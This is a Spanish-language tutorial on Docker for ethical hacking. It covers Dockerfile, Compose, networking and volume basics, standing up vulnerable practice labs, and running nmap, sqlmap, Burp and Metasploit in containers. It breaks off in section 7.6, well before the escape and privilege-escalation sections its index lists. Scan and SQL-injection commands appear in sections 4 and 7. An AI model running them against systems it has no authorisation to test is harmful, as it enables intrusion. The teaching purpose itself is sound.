# d0ck3r-f0r-h4ck3rs.md
## [docker](../raw/d0ck3r-f0r-h4ck3rs.md) para Hacking

> **Autor:** Contribución comunitaria
> **Nivel:** Intermedio
> **Objetivo:** Usar Docker para entornos de hacking ético: laboratorios vulnerables, herramientas de pentesting, enumeración de containers, abuso de Docker para escalación de privilegios y hardening.
> **Requisitos:** Conocimientos básicos de Linux, [redes](../raw/r3d3s-f0nd4m3nt0s.md) y pentesting.

---

## Índice

> ⏱️ **Tiempo estimado:** 15 horas (~3 sesiones) (2334 lineas)


1. [Introducción](#1-introducción)
   - 1.1 [Por qué Docker para hacking](#11-por-qué-docker-para-hacking)
   - 1.2 [Conceptos: imagen vs container vs volume vs network](#12-conceptos-imagen-vs-container-vs-volume-vs-network)
2. [Docker Basics](#2-docker-basics)
   - 2.1 [FROM: imágenes base](#21-from-imágenes-base)
   - 2.2 [RUN: construir capas](#22-run-construir-capas)
   - 2.3 [CMD y ENTRYPOINT](#23-cmd-y-entrypoint)
   - 2.4 [COPY y ADD](#24-copy-y-add)
   - 2.5 [ENV y ARG](#25-env-y-arg)
   - 2.6 [WORKDIR y USER](#26-workdir-y-user)
   - 2.7 [EXPOSE y VOLUME](#27-expose-y-volume)
   - 2.8 [HEALTHCHECK](#28-healthcheck)
3. [Docker Compose](#3-docker-compose)
   - 3.1 [docker-compose.yml structure](#31-docker-composeyml-structure)
   - 3.2 [Services, networks, volumes](#32-services-networks-volumes)
   - 3.3 [Environment variables y ports](#33-environment-variables-y-ports)
   - 3.4 [depends_on, restart, healthcheck](#34-depends_on-restart-healthcheck)
   - 3.5 [Profiles](#35-profiles)
4. [Docker Networking](#4-docker-networking)
   - 4.1 [Bridge: default network](#41-bridge-default-network)
   - 4.2 [Host: sin aislamiento de red](#42-host-sin-aislamiento-de-red)
   - 4.3 [None: sin red](#43-none-sin-red)
   - 4.4 [Overlay: multi-host](#44-overlay-multi-host)
   - 4.5 [Macvlan e Ipvlan](#45-macvlan-e-ipvlan)
   - 4.6 [Custom networks](#46-custom-networks)
   - 4.7 [DNS y port publishing](#47-dns-y-port-publishing)
   - 4.8 [Network aliases](#48-network-aliases)
5. [Docker Volumes](#5-docker-volumes)
   - 5.1 [Bind mounts](#51-bind-mounts)
   - 5.2 [Named volumes](#52-named-volumes)
   - 5.3 [tmpfs: montaje en RAM](#53-tmpfs-montaje-en-ram)
   - 5.4 [Volume drivers](#54-volume-drivers)
   - 5.5 [Backup y restore de volumes](#55-backup-y-restore-de-volumes)
6. [Docker para Laboratorios Vulnerables](#6-docker-para-laboratorios-vulnerables)
   - 6.1 [Metasploitable en Docker](#61-metasploitable-en-docker)
   - 6.2 [DVWA](#62-dvwa)
   - 6.3 [Juiceshop](#63-juiceshop)
   - 6.4 [Vulhub](#64-vulhub)
   - 6.5 [WebGoat](#65-webgoat)
   - 6.6 [Multidae](#66-multidae)
   - 6.7 [Auto-scaling: levantar múltiples targets](#67-auto-scaling-levantar-múltiples-targets)
7. [Docker para Herramientas de Pentesting](#7-docker-para-herramientas-de-pentesting)
   - 7.1 [Nmap en container](#71-nmap-en-container)
   - 7.2 [Burp Suite en container](#72-burp-suite-en-container)
   - 7.3 [SQLMap en container](#73-sqlmap-en-container)
   - 7.4 [Metasploit en container](#74-metasploit-en-container)
   - 7.5 [Containerizando herramientas custom](#75-containerizando-herramientas-custom)
   - 7.6 [Kali Linux en Docker](#76-kali-linux-en-docker)
8. [Docker Security](#8-docker-security)
   - 8.1 [USER: correr como non-root](#81-user-correr-como-non-root)
   - 8.2 [Read-only rootfs](#82-read-only-rootfs)
   - 8.3 [Dropping capabilities](#83-dropping-capabilities)
   - 8.4 [Seccomp profiles](#84-seccomp-profiles)
   - 8.5 [AppArmor](#85-apparmor)
   - 8.6 [Docker Bench Security](#86-docker-bench-security)
9. [Container Enumeration](#9-container-enumeration)
   - 9.1 [Host filesystem mounts](#91-host-filesystem-mounts)
   - 9.2 [Capabilities enumeration](#92-capabilities-enumeration)
   - 9.3 [cgroups y escapes](#93-cgroups-y-escapes)
   - 9.4 [Environment variables: secrets expuestos](#94-environment-variables-secrets-expuestos)
   - 9.5 [Mounted secrets](#95-mounted-secrets)
10. [Abusing Docker](#10-abusing-docker)
    - 10.1 [Privilege escalation via Docker group](#101-privilege-escalation-via-docker-group)
    - 10.2 [Mounting host filesystem](#102-mounting-host-filesystem)
    - 10.3 [Docker socket compromise](#103-docker-socket-compromise)
    - 10.4 [Container escape techniques](#104-container-escape-techniques)
    - 10.5 [Abusing --privileged flag](#105-abusing---privileged-flag)
11. [Docker Registry](#11-docker-registry)
    - 11.1 [Running private registry](#111-running-private-registry)
    - 11.2 [Pushing/pulling images](#112-pushingpulling-images)
    - 11.3 [Image tagging](#113-image-tagging)
    - 11.4 [Registry API](#114-registry-api)
    - 11.5 [Registry security](#115-registry-security)
12. [Ejercicios Prácticos](#12-ejercicios-prácticos)
    - 12.1 [Ejercicio 1: Levantar un lab vulnerable con compose](#121-ejercicio-1-levantar-un-lab-vulnerable-con-compose)
    - 12.2 [Ejercicio 2: Containerizar SQLMap](#122-ejercicio-2-containerizar-sqlmap)
    - 12.3 [Ejercicio 3: Escalar privilegios via Docker](#123-ejercicio-3-escalar-privilegios-via-docker)
    - 12.4 [Ejercicio 4: Enumerar un container comprometido](#124-ejercicio-4-enumerar-un-container-comprometido)
    - 12.5 [Ejercicio 5: Hardening de un Dockerfile](#125-ejercicio-5-hardening-de-un-dockerfile)
    - 12.6 [Ejercicio 6: Docker socket attack](#126-ejercicio-6-docker-socket-attack)
    - 12.7 [Ejercicio 7: Setup de registry privado con autenticación](#127-ejercicio-7-setup-de-registry-privado-con-autenticación)
    - 12.8 [Ejercicio 8: Dockerscan: escanear hosts con Docker](#128-ejercicio-8-dockerscan-escanear-hosts-con-docker)
13. [Referencias](#13-referencias)

---

## 1) Introducción

### 1.1 Por qué [docker](../raw/d0ck3r-f0r-h4ck3rs.md) para hacking

Docker es una herramienta que cambió la forma de deployar software. Pero para un hacker (ético), Docker es una navaja suiza:

- **Levantar laboratorios vulnerables en segundos**: DVWA, WebGoat, Juiceshop, Vulhub — todo con un `docker compose up`
- **Aislar herramientas**: cada herramienta con sus dependencias, sin contaminar tu sistema
- **Snapshotting**: probá algo, rompelo, reiniciá el [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores), listo
- **Portabilidad**: compartí tu configuración de herramientas via Dockerfile
- **Escalación de privilegios**: si el host tiene Docker mal configurado, podés escapar del container al host
- **Enumeración**: cuando comprometés un container, podés buscar formas de escapar

### 1.2 Conceptos: imagen vs container vs volume vs network

```bash
# IMAGEN: template de solo lectura (como un ISO)
docker pull ubuntu:22.04
docker images

# CONTAINER: instancia en ejecución de una imagen
docker run -it ubuntu:22.04 bash
docker ps

# VOLUME: persistencia de datos fuera del container
docker volume create mi_volumen

# NETWORK: conectividad entre containers y el host
docker network create mi_red
```

```
┌──────────────────────────────────┐
│           HOST (Linux)           │
│                                  │
│  ┌──────────┐  ┌──────────┐     │
│  │Container1│  │Container2│     │
│  │  nginx    │  │  mysql   │     │
│  │          │  │          │     │
│  └─────┬────┘  └────┬─────┘     │
│        │volume      │volume     │
│        │/var/www    │/var/lib/  │
│        │            │mysql      │
│  ┌─────┴────┐  ┌───┴───────┐   │
│  │  bind    │  │  named    │   │
│  │  mount   │  │  volume   │   │
│  └──────────┘  └───────────┘   │
└──────────────────────────────────┘
```

---

## 2) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Basics

### 2.1 FROM: imágenes base

```dockerfile
# Imágenes base oficiales (recomendadas, actualizadas)
FROM ubuntu:22.04
FROM debian:bookworm-slim
FROM alpine:3.19           # ultra-liviana (~5 MB)
FROM python:3.11-slim      # Python con lo mínimo
FROM node:20-alpine        # Node.js minimal
FROM golang:1.21-alpine    # Go build environment
FROM scratch               # desde cero (para binarios estáticos)

# NO USES (obsolescencia, CVE conocidos):
FROM ubuntu:18.04          # muy viejo
FROM centos:7              # discontinuado
FROM python:2.7            # EOL
```

### 2.2 RUN: construir capas

```dockerfile
# Cada RUN crea una capa. Menos capas = imagen más chica.

# MAL (3 capas):
RUN apt update
RUN apt install -y nginx
RUN apt clean

# BIEN (1 capa):
RUN apt update && \
    apt install -y nginx && \
    apt clean && \
    rm -rf /var/lib/apt/lists/*

# Ejecutar scripts:
COPY install.sh /tmp/
RUN chmod +x /tmp/install.sh && /tmp/install.sh && rm /tmp/install.sh
```

### 2.3 CMD y ENTRYPOINT

```dockerfile
# ENTRYPOINT: comando que siempre se ejecuta
# CMD: argumentos por defecto (se sobreescribe con argumentos de docker run)

# Forma 1: exec (preferida, recibe señales correctamente)
ENTRYPOINT ["nginx"]
CMD ["-g", "daemon off;"]

# Forma 2: shell (no recomendada, no recibe señales)
ENTRYPOINT nginx -g "daemon off;"

# Diferencia:
docker run mi-imagen              # corre: nginx -g "daemon off;"
docker run mi-imagen -t           # corre: nginx -g "daemon off;" -t (test config)
docker run --entrypoint bash mi-imagen  # sobreescribe entrypoint

# Script de entrypoint (recomendado para entrypoints complejos):
COPY docker-entrypoint.sh /
RUN chmod +x /docker-entrypoint.sh
ENTRYPOINT ["/docker-entrypoint.sh"]
CMD ["nginx", "-g", "daemon off;"]
```

```bash
#!/bin/bash
# docker-entrypoint.sh
set -e

# Procesar variables de entorno, config, etc.
if [ "$1" = "nginx" ]; then
    envsubst < /etc/nginx/templates/default.conf.tpl > /etc/nginx/conf.d/default.conf
fi

exec "$@"
```

### 2.4 COPY y ADD

```dockerfile
# COPY: copia archivos del contexto de build
COPY ./app /opt/app
COPY requirements.txt /tmp/
COPY --chown=appuser:appgroup ./config /etc/app/
COPY --chmod=755 ./script.sh /usr/local/bin/

# ADD: como COPY pero soporta:
# - URLs (NO USAR, no reproducible)
# - Auto-extracción de .tar.gz (útil ocasionalmente)
ADD app.tar.gz /opt/       # extrae automáticamente
# ADD https://example.com/file /tmp/  # EVITAR

# .dockerignore: excluir archivos del contexto
# .dockerignore:
# node_modules/
# .git/
# *.log
# secrets/
```

### 2.5 ENV y ARG

```dockerfile
# ARG: solo durante build
ARG VERSION=1.0
ARG DEBIAN_FRONTEND=noninteractive
RUN echo "Building version ${VERSION}"

# ENV: disponible en build y runtime
ENV NODE_ENV=production
ENV DB_HOST=localhost
ENV APP_HOME=/opt/app
WORKDIR $APP_HOME

# ARG puede tener default desde docker build:
# docker build --build-arg VERSION=2.0 -t miapp .

# ENV se puede sobreescribir en runtime:
# docker run -e DB_HOST=db-server -e NODE_ENV=development miapp
```

### 2.6 WORKDIR y USER

```dockerfile
# WORKDIR: establece directorio de trabajo (crea si no existe)
WORKDIR /opt/app       # equivalente a RUN mkdir -p /opt/app && cd /opt/app
RUN pwd                # /opt/app

# USER: corre como usuario no-root (seguridad!)
RUN groupadd -r appgroup && useradd -r -g appgroup appuser
USER appuser

# Recomendado: crear usuario al final del Dockerfile
# (para que las capas de instalación de dependencias sean root)
```

### 2.7 EXPOSE y VOLUME

```dockerfile
# EXPOSE: documenta qué puertos usa el container (no publica)
EXPOSE 80
EXPOSE 443
EXPOSE 8080/tcp
EXPOSE 53/udp

# VOLUME: declara punto de montaje para persistencia
VOLUME /var/lib/mysql
VOLUME /var/log/app
VOLUME ["/data", "/config"]

# "bind mount" en runtime:
# docker run -v /host/path:/container/path ...

# "named volume" en runtime:
# docker run -v mivolumen:/container/path ...
```

### 2.8 HEALTHCHECK

```dockerfile
# HEALTHCHECK: monitoreo del estado del container
HEALTHCHECK --interval=30s --timeout=3s --start-period=5s --retries=3 \
    CMD curl -f http://localhost:80/health || exit 1

# Docker usa el exit code:
# 0: healthy
# 1: unhealthy
# 2: reserved / starting

# Ver health en docker ps:
# docker ps --format "table {{.Names}}\t{{.Status}}"
```

---

## 3) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Compose

### 3.1 docker-compose.yml structure

```yaml
version: "3.8"  # o "3.9" (más reciente)

services:
  # definiciones de servicios
  web:
    image: nginx:alpine
    ...

volumes:
  # definiciones de volúmenes

networks:
  # definiciones de redes

secrets:
  # definiciones de secretos (Docker Swarm/Kubernetes)

configs:
  # definiciones de configuraciones
```

### 3.2 Services, networks, volumes

```yaml
version: "3.8"

services:
  web:
    image: nginx:alpine
    container_name: mi-webserver      # nombre fijo (no recomendado para scale)
    ports:
      - "80:80"
      - "443:443"
    volumes:
      - ./html:/usr/share/nginx/html:ro
      - web-logs:/var/log/nginx
    networks:
      - frontend
    depends_on:
      - api
    restart: unless-stopped

  api:
    build: ./api
    expose:
      - "3000"
    environment:
      - DB_HOST=db
      - DB_USER=app
      - DB_PASSWORD=mypassword        # MAL: hardcodeada
      - DB_NAME=myapp
    networks:
      - frontend
      - backend
    healthcheck:
      test: ["CMD", "curl", "-f", "http://localhost:3000/health"]
      interval: 30s
      timeout: 10s
      retries: 3

  db:
    image: postgres:15-alpine
    volumes:
      - pgdata:/var/lib/postgresql/data
    environment:
      POSTGRES_DB: myapp
      POSTGRES_USER: app
      POSTGRES_PASSWORD_FILE: /run/secrets/db_password
    secrets:
      - db_password
    networks:
      - backend
    restart: always

volumes:
  web-logs:
  pgdata:

networks:
  frontend:
  backend:
    internal: true          # sin acceso externo

secrets:
  db_password:
    file: ./secrets/db_password.txt
```

### 3.3 Environment variables y ports

```yaml
services:
  app:
    image: miapp

    # Formas de pasar variables de entorno:
    # 1. Lista
    environment:
      - NODE_ENV=production
      - DEBUG=false

    # 2. Mapa
    environment:
      NODE_ENV: production
      DEBUG: "false"

    # 3. Desde archivo .env
    env_file:
      - .env.production
      - ./common.env

    # Publicar puertos:
    ports:
      - "80:80"             # host:container
      - "443:443"
      - "3000:3000/tcp"    # protocolo específico
      - "1000-2000:1000-2000"  # rango
      - "8080:80"           # redirigir puerto

    # Exponer sin publicar (solo para otros containers en la red):
    expose:
      - "3000"
      - "4000-4005"
```

### 3.4 depends_on, restart, healthcheck

```yaml
services:
  web:
    depends_on:
      - db                    # espera que db esté "running" (no "ready")

    # Mejor: healthcheck conditions (desde v3.8)
    depends_on:
      db:
        condition: service_healthy      # espera healthcheck OK
      redis:
        condition: service_started

  db:
    image: postgres
    healthcheck:
      test: ["CMD-SHELL", "pg_isready -U postgres"]
      interval: 10s
      timeout: 5s
      retries: 5
      start_period: 30s                 # tiempo inicial antes de chequear

  cache:
    image: redis:alpine
    restart: always                     # siempre se reinicia
    # restart policies:
    # no              - no reiniciar (default)
    # always          - siempre reiniciar
    # on-failure      - reiniciar si falla (exit code != 0)
    # unless-stopped  - reiniciar a menos que se detenga explícitamente
```

### 3.5 Profiles

Los profiles permiten activar/desactivar servicios al levantar compose:

```yaml
services:
  web:
    image: nginx
    profiles: ["web"]         # solo con --profile web

  db:
    image: postgres
    profiles: ["db"]

  adminer:
    image: adminer
    profiles: ["admin", "all"]

  monitoring:
    image: prom/prometheus
    profiles: ["monitoring"]

  # Servicio sin profile: siempre se levanta
  redis:
    image: redis:alpine
```

```bash
# Levantar solo servicios con profile "web":
docker compose --profile web up

# Múltiples profiles:
docker compose --profile web --profile db up

# Todos los profiles:
docker compose --profile "*" up

# Útil para labs de hacking:
# linux --profile monitoring --profile vulnerable
```

---

## 4) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Networking

### 4.1 Bridge: default network

```bash
# Bridge es la red por defecto para containers
# Los containers se comunican entre sí por IP (no por nombre)

docker network ls
# NETWORK ID     NAME      DRIVER    SCOPE
# abc123...      bridge    bridge    local
# def456...      host      host      local
# ghi789...      none      null      local

# Los containers en bridge pueden verse por IP
# pero NO por nombre de container

docker run -d --name c1 nginx
docker run -d --name c2 nginx
docker inspect c1 | grep IPAddress
# "IPAddress": "172.17.0.2"
docker exec c2 ping 172.17.0.2  # funciona
docker exec c2 ping c1          # NO funciona (DNS resolution?)
```

### 4.2 Host: sin aislamiento de [red](../raw/r3d3s-f0nd4m3nt0s.md)

```bash
# Host network: el container comparte la red del host
# No tiene IP propia, usa la del host directamente
# Útil para herramientas de red (nmap, etc.) pero peligroso

docker run --network host nginx
# Accesible en localhost:80 directamente
# El container puede ver todas las interfaces del host

# Uso en pentesting: escanear desde el contexto del host
docker run --network host --rm -it kalilinux/kali nmap -sn 192.168.1.0/24
```

### 4.3 None: sin red

```bash
# El container no tiene interfaz de red
# Solo loopback (lo)
# Útil para aislamiento extremo

docker run --network none --rm alpine sh
ip link  # solo lo
```

### 4.4 Overlay: multi-host

```bash
# Overlay network conecta containers en diferentes hosts
# Requiere Docker Swarm o definición manual

# Solo Swarm mode:
docker swarm init
docker network create --driver overlay mi_overlay
docker service create --network mi_overlay nginx
```

### 4.5 Macvlan e Ipvlan

```bash
# Macvlan: asigna una MAC real al container
# El container aparece como dispositivo físico en la red
# Útil para integrar containers en la red existente

docker network create -d macvlan \
    --subnet=192.168.1.0/24 \
    --gateway=192.168.1.1 \
    -o parent=eth0 \
    macvlan_red

docker run --network macvlan_red --ip=192.168.1.100 nginx

# Ipvlan: como macvlan pero comparte la MAC del host
# Las IPs se asignan dentro de la subnet existente
docker network create -d ipvlan \
    --subnet=10.0.0.0/24 \
    -o parent=eth0 \
    ipvlan_red
```

### 4.6 Custom networks

```bash
# Las custom networks tienen DNS automático
# Los containers se resuelven por nombre (SUPER ÚTIL)

docker network create --driver bridge --subnet 172.20.0.0/16 mi_red

docker run -d --network mi_red --name web nginx
docker run -d --network mi_red --name db postgres

# Ahora funciona:
docker exec web ping db       # resuelve por nombre!
docker exec db ping web       # igual

# Sin custom network: solo por IP

# Red con opciones avanzadas:
docker network create \
    --driver bridge \
    --subnet=10.5.0.0/16 \
    --ip-range=10.5.3.0/24 \
    --gateway=10.5.3.1 \
    --label environment=production \
    -o com.docker.network.bridge.name=docker_br1 \
    -o com.docker.network.bridge.enable_ip_masquerade=false \
    personalizada
```

### 4.7 [dns](../raw/r3d3s-f0nd4m3nt0s.md#dns) y port publishing

```bash
# DNS en custom networks: resolución por nombre de container o alias
# DNS en bridge default: por IP only

# Port publishing (mapear puertos):
# -p <host>:<container>
# -p <ip>:<host>:<container>

docker run -p 80:80 nginx
docker run -p 192.168.1.10:8080:80 nginx  # bind a IP específica
docker run -p 80:80/tcp -p 53:53/udp nginx  # TCP y UDP

# Sin -p: el container es accesible SOLO desde otros containers
# en la misma red (no desde el host)

# Ver mapeos:
docker port web
# 80/tcp -> 0.0.0.0:80
```

### 4.8 Network aliases

```bash
# Un container puede tener múltiples nombres en la red
docker network create appnet
docker run -d --network appnet --network-alias api --network-alias backend app

# Otros containers pueden resolver:
ping api       # funciona
ping backend   # funciona

# Útil para load balancing básico con múltiples containers
# compartiendo el mismo alias:
docker run -d --network appnet --network-alias web nginx
docker run -d --network appnet --network-alias web nginx
# round-robin DNS entre ambos
```

---

## 5) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) Volumes

### 5.1 Bind mounts

```bash
# Bind mount: monta un directorio del host en el container
# Ruta absoluta obligatoria

docker run -v /home/user/data:/app/data nginx
docker run -v /var/run/docker.sock:/var/run/docker.sock nginx  # PELIGROSO

# Con --mount (más explícito):
docker run --mount type=bind,source=/home/user/data,target=/app/data nginx

# Bind mount read-only:
docker run -v /host/config:/app/config:ro nginx
docker run --mount type=bind,source=/host/config,target=/app/config,readonly nginx

# Bind mount desde el host al container:
# cambios en /home/user/data aparecen en /app/data y viceversa
```

### 5.2 Named volumes

```bash
# Named volumes: manejados por Docker, almacenados en /var/lib/docker/volumes/

# Crear volumen
docker volume create mi_data

# Listar volúmenes
docker volume ls

# Inspeccionar
docker volume inspect mi_data
# {
#   "Driver": "local",
#   "Mountpoint": "/var/lib/docker/volumes/mi_data/_data",
#   "Name": "mi_data"
# }

# Usar volumen
docker run -v mi_data:/data nginx
docker run --mount source=mi_data,target=/data nginx

# Ventajas sobre bind mounts:
# - Más portátil (no depende de rutas absolutas)
# - Backup/restore más simple
# - Drivers para almacenamiento remoto (NFS, S3, etc.)

# Eliminar volúmenes no usados
docker volume prune
```

### 5.3 tmpfs: montaje en RAM

```bash
# tmpfs: monta un filesystem en memoria (no persistente)
# Útil para datos temporales, secretos, etc.

docker run --tmpfs /tmp nginx
docker run --tmpfs /app/cache:noexec,nosuid,size=100M nginx

# Con --mount:
docker run --mount type=tmpfs,destination=/app/cache,tmpfs-size=100M nginx

# OJO: tmpfs SOLO funciona en Linux (no Docker Desktop en Windows/Mac)
```

### 5.4 Volume drivers

```bash
# Plugins de volumen para almacenamiento remoto:

# NFS
docker volume create --driver local \
    --opt type=nfs \
    --opt o=addr=10.0.0.100,rw \
    --opt device=:/exports/data \
    nfs_volume

# Rook/Ceph (CSI)
docker volume create --driver rook-ceph ...

# S3/Cloud
# (terceros: rexray, cifs, etc.)

# plugins de Docker Hub:
docker plugin install vieux/sshfs
docker volume create --driver vieux/sshfs -o sshcmd=user@host:/path sshvolume
```

### 5.5 Backup y restore de volumes

```bash
# BACKUP de un volume a un archivo .tar
# Usamos un container temporal con bind mount para el backup

# Volumen: mi_data
# Hacer backup:
docker run --rm -v mi_data:/source -v $(pwd):/backup alpine \
    tar czf /backup/mi_data_backup_$(date +%Y%m%d).tar.gz -C /source .

# RESTORE de un backup
docker run --rm -v mi_data:/target -v $(pwd):/backup alpine \
    tar xzf /backup/mi_data_backup.tar.gz -C /target

# Backup de base de datos PostgreSQL:
docker exec pg_container pg_dumpall -U postgres > backup.sql
# Restore:
cat backup.sql | docker exec -i pg_container psql -U postgres

# Backup de MySQL:
docker exec mysql_container mysqldump --all-databases -u root -p$PASS > backup.sql
```

---

## 6) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) para Laboratorios Vulnerables

### 6.1 Metasploitable en Docker

No existe imagen oficial de Metasploitable en Docker, pero podés emular sus servicios vulnerables:

```bash
# Servicios individuales que componen Metasploitable:
docker run -d --name tomcat6 -p 8180:8080 vulnerables/tomcat6
docker run -d --name vsftpd -p 21:21 vulnerables/vsftpd
docker run -d --name ssh -p 2222:22 vulnerables/openssh
# O imágenes todo-en-uno:
docker run -d --name metasploitable -p 21:21 -p 22:22 -p 23:23 -p 80:80 \
    -p 139:139 -p 445:445 -p 512:512 -p 513:513 -p 514:514 \
    -p 1099:1099 -p 1521:1521 -p 3306:3306 -p 3632:3632 \
    -p 5432:5432 -p 5900:5900 -p 6000:6000 -p 6667:6667 \
    -p 8009:8009 -p 8180:8180 -p 8787:8787 \
    vulnerables/metasploitable2-emu
```

### 6.2 DVWA

Damn Vulnerable Web Application (DVWA) en Docker:

```yaml
# docker-compose.yml
version: "3.8"

services:
  dvwa:
    image: vulnerables/web-dvwa
    ports:
      - "8080:80"
    environment:
      - DB_SERVER=mysql
    depends_on:
      - mysql

  mysql:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: dvwa
      MYSQL_DATABASE: dvwa
```

```bash
# O simple:
docker run --rm -it -p 8080:80 vulnerables/web-dvwa
# Acceder: http://localhost:8080/login.php
# Crear DB: click en "Create/Reset Database" (admin:password)
```

### 6.3 Juiceshop

[owasp](../raw/w3b-h4ck1ng.md#owasp-top-10) Juice Shop (aplicación Node.js con vulnerabilidades modernas):

```bash
# Con Docker (recomendado):
docker run --rm -p 3000:3000 bkimminich/juice-shop
# Acceder: http://localhost:3000

# Con Docker Compose:
wget https://raw.githubusercontent.com/juice-shop/juice-shop/master/docker-compose.yml
docker compose up

# Para hacer scoring de challenges (CTF):
docker run --rm -p 3000:3000 -e "CTF_KEY=my-ctf-key" bkimminich/juice-shop
```

### 6.4 Vulhub

Vulhub es un repositorio de entornos vulnerables basados en Docker Compose:

```bash
# Clonar repositorio
git clone https://github.com/vulhub/vulhub.git
cd vulhub

# Elegir y levantar un entorno:
# Por ejemplo: CVE-2014-6271 (Shellshock)
cd httpd/CVE-2014-6271
docker compose up -d

# Otros ejemplos:
cd ../tomcat/CVE-2017-12617
docker compose up -d

# UnrealIRCd backdoor
cd ../unrealircd/CVE-2010-2075
docker compose up -d

# Siempre parar después de usar:
docker compose down
```

### 6.5 WebGoat

OWASP WebGoat (aplicación Java con lecciones de seguridad):

```bash
# WebGoat + WebWolf (herramienta de ataque companion)
docker run -d -p 127.0.0.1:8080:8080 -p 127.0.0.1:9090:9090 webgoat/goatandwolf

# Acceder:
# WebGoat: http://localhost:8080/WebGoat
# WebWolf: http://localhost:9090/WebWolf

# Solo WebGoat:
docker run -d -p 8080:8080 webgoat/webgoat
```

### 6.6 Multidae

Damn Vulnerable Linux (Multidae - entorno completo con múltiples servicios):

```yaml
# docker-compose.yml para Multidae
version: "3.8"

services:
  multidae:
    image: opendnssec/multidae
    ports:
      - "80:80"
      - "443:443"
      - "3306:3306"
      - "5900:5900"
    privileged: true
    environment:
      - MYSQL_ROOT_PASSWORD=multidae
```

### 6.7 Auto-scaling: levantar múltiples targets

Para practicar ataques a múltiples víctimas:

```yaml
version: "3.8"

services:
  dvwa-1:
    image: vulnerables/web-dvwa
    ports:
      - "8081:80"
    environment:
      - DB_SERVER=mysql-1
    depends_on:
      - mysql-1
    profiles: ["full"]

  dvwa-2:
    image: vulnerables/web-dvwa
    ports:
      - "8082:80"
    environment:
      - DB_SERVER=mysql-2
    depends_on:
      - mysql-2
    profiles: ["full"]

  juice-shop:
    image: bkimminich/juice-shop
    ports:
      - "3000:3000"
    profiles: ["full", "owasp"]

  webgoat:
    image: webgoat/goatandwolf
    ports:
      - "8080:8080"
      - "9090:9090"
    profiles: ["full", "owasp"]

  mysql-1:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: dvwa
      MYSQL_DATABASE: dvwa
    profiles: ["full"]

  mysql-2:
    image: mysql:5.7
    environment:
      MYSQL_ROOT_PASSWORD: dvwa
      MYSQL_DATABASE: dvwa
    profiles: ["full"]
```

```bash
# Lab completo:
docker compose --profile full up

# Solo OWASP apps:
docker compose --profile owasp up

# Limpiar todo:
docker compose --profile "*" down
```

---

## 7) [docker](../raw/d0ck3r-f0r-h4ck3rs.md) para Herramientas de Pentesting

### 7.1 [nmap](../raw/nm4p.md) en [container](../raw/d0ck3r-f0r-h4ck3rs.md#contenedores)

```bash
# Nmap oficial en Docker
docker run --rm -it --network host instrumentisto/nmap -sS 192.168.1.1

# Con red host (recomendado) para escaneos raw
docker run --rm --network host instrumentisto/nmap -sV -p- scanme.nmap.org

# Con capacidades adicionales para SYN scan:
docker run --rm --network host --cap-add NET_RAW --cap-add NET_ADMIN \
    instrumentisto/nmap -sS 10.0.0.1

# Escaneo con scripts NSE:
docker run --rm --network host instrumentisto/nmap -sV --script=http-title scanme.nmap.org

# Crear alias:
alias nmap="docker run --rm --network host --cap-add NET_RAW instrumentisto/nmap"
```

### 7.2 [burp suite](../raw/w3b-h4ck1ng.md#burp-suite) en container

```bash
# Burp Suite Professional requiere GUI. Opciones:

# 1. Con X11 forwarding (solo Linux):
docker run --rm -it \
    --network host \
    -e DISPLAY=$DISPLAY \
    -v /tmp/.X11-unix:/tmp/.X11-unix \
    -v ~/burp_projects:/projects \
    burpsuite/burpsuite

# 2. Con VNC (más portable):
docker run -d \
    -p 5900:5900 \
    -p 8080:8080 \
    -v ~/burp_projects:/projects \
    burpsuite/burpsuite-vnc

# 3. Dockerfile para Burp:
FROM openjdk:11-jre
WORKDIR /opt/burp
COPY burpsuite_pro.jar .
EXPOSE 8080 8081
ENTRYPOINT ["java", "-jar", "burpsuite_pro.jar"]

# 4. O usar community edition pre-build:
# docker pull secsi/burpsuite
# docker run -it --rm -e DISPLAY=:0 secsi/burpsuite
```

### 7.3 [sqlmap](../raw/w3b-h4ck1ng.md#sqlmap) en container

```bash
# SQLMap en Docker
docker run --rm -it pauloschilling/sqlmap -u "http://example.com/page?id=1" --dbs

# Con persistencia de output:
docker run --rm -it -v $(pwd)/sqlmap_output:/home/sqlmap/.sqlmap/ \
    pauloschilling/sqlmap -u "http://example.com/page?id=1" --dbs

# Alias útil:
alias sqlmap='docker run --rm -it --network host -v "$(pwd)/output:/output" pauloschilling/sqlmap'

# O container con todas las herramientas:
FROM alpine:latest
RUN apk add --no-cache python3 py3-pip git
RUN pip install sqlmap
WORKDIR /workspace
ENTRYPOINT ["sqlmap"]
```

### 7.4 [metasploit](../raw/m3t4spl01t.md) en container

```bash
# Metasploit Framework en Docker
docker run --rm -it --network host \
    -v ~/msf_data:/data \
    metasploitframework/metasploit-framework:latest \
    msfconsole

# Con persistencia de datos (base de datos, config):
docker volume create msf_data

docker run --rm -it --network host \
    -v msf_data:/home/msf/.msf4 \
    metasploitframework/metasploit-framework:latest

# Inicializar DB (primera vez):
# dentro de msfconsole:
# db_init
# db_status

# Con PostgreSQL persistente:
docker run -d --name msf-postgres \
    -e POSTGRES_PASSWORD=msf \
    -e POSTGRES_DB=msf \
    postgres:15-alpine

docker run --rm -it --network host \
    --link msf-postgres:postgres \
    metasploitframework/metasploit-framework:latest
```

### 7.5 Containerizando herramientas custom

```dockerfile
# Dockerfile para herramienta de pentesting custom
# Ejemplo: script de enumeración automática

FROM python:3.11-slim

# Dependencias
RUN pip install --no-cache-dir \
    requests \
    beautifulsoup4 \
    colorama \
    python-nmap

# Herramienta
COPY my_enum_tool.py /usr/local/bin/
RUN chmod +x /usr/local/bin/my_enum_tool.py

# Configuración de red (necesita raw sockets para escaneos)
RUN setcap cap_net_raw+ep /usr/local/bin/python3.11

WORKDIR /workspace
ENTRYPOINT ["my_enum_tool.py"]
```

```bash
# Build y uso
docker build -t my-enum-tool .
docker run --rm --network host -v $(pwd):/workspace my-enum-tool -t 10.0.0.1
```

### 7.6 Kali Linux en Docker

```bash
# Kali Linux Docker (oficial)
docker run --rm -it --network host kalilinux/kali-rolling /bin/bash

# Instalar herramientas dentro (son capa temporal, o build imagen propia)
apt update && apt install -y kali-linux-headless

# Kali con herramientas específicas pre-instaladas:
